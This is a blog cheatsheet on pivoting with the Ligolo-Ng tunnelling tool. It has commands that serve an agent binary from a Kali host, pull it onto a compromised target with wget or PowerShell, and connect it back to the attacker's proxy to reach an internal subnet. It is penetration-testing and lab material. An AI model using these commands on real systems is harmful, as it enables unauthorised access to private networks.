---
layout: post
title:  Ligolo-Ng Cheatsheet
description: Cheatsheet for Ligolo-Ng
date:   2024-10-31 09:00:00 +0300
image:  '/images/21.jpg'
tags:   [Cheatsheets, Tools, Pivoting]
---
# Getting Ligolo-Ng
Important Note: Make sure you are always using the same version of Proxy and Agent.

## Download the binaries manually (recommended)
### PROXY (Run this on Kali)
- [Linux 64-bits Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz)
- [Windows 64-bits Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_windows_amd64.zip)

### AGENT (Run this on Pivot Host)
- [Linux 64-bits Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz)
- [Windows 64-bits Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip)

For more information about Ligolo-Ng, visit its official [GitHub Repository](https://github.com/nicocha30/ligolo-ng).

# Alternative with Package Installer
```shell
sudo apt install ligolo-ng
# Locate, copy the needed files and run them (Example with agent file)
sudo updatedb -v
locate agent
sudo cp /path/to/ligolo/agent .
sudo chmod +x agent
./agent
```

# Basic Pivot
Move the agent file into the pivot host:
```shell
# On Kali
sudo cp /home/kali/Downloads/ligolo-ng_agent_0.7.2_linux_amd64/agent .
python3 -m http.server 443
# On Target (Linux)
cd /tmp
wget http://<kali_ip>:443/agent
# On Target (Windows using PowerShell)
cd C:\Windows\Temp
powershell -c iwr http://<kali_ip>:443/agent.exe -OutFile agent.exe
```
Set up Ligolo-Ng on Kali:
```shell
# Create an interface
sudo ip tuntap add user Vorkharium mode tun ligolo
sudo ip link set ligolo up
# Add new IP range we want to access (Examine Pivot Host with ifconfig, ip a, etc commands)
sudo ip route add 172.16.150.0/24 dev ligolo
ip route list
# Run the proxy file
sudo chmod +x proxy
./proxy -selfcert
# The Ligolo-Ng console will now open (We will interact with it soon)
```

On the Pivot target, use the agent file to connect to our running proxy:
```shell
chmod +x agent
./agent --connect <kali_ip>:11601 -ignore-cert
```

Now enter the following on the Ligolo-Ng console:
```shell
# Enter "session" to show the available sessions
ligolo-ng » session
# Enter "1" to select the session we created when using the agent (There is only one session to choose in this case)
? Specify a session : 1
# Enter "start" to start the connection
[Agent : hackme@compromisedmachine] » start
# Now we are able to access the network 172.16.150.0/24
```


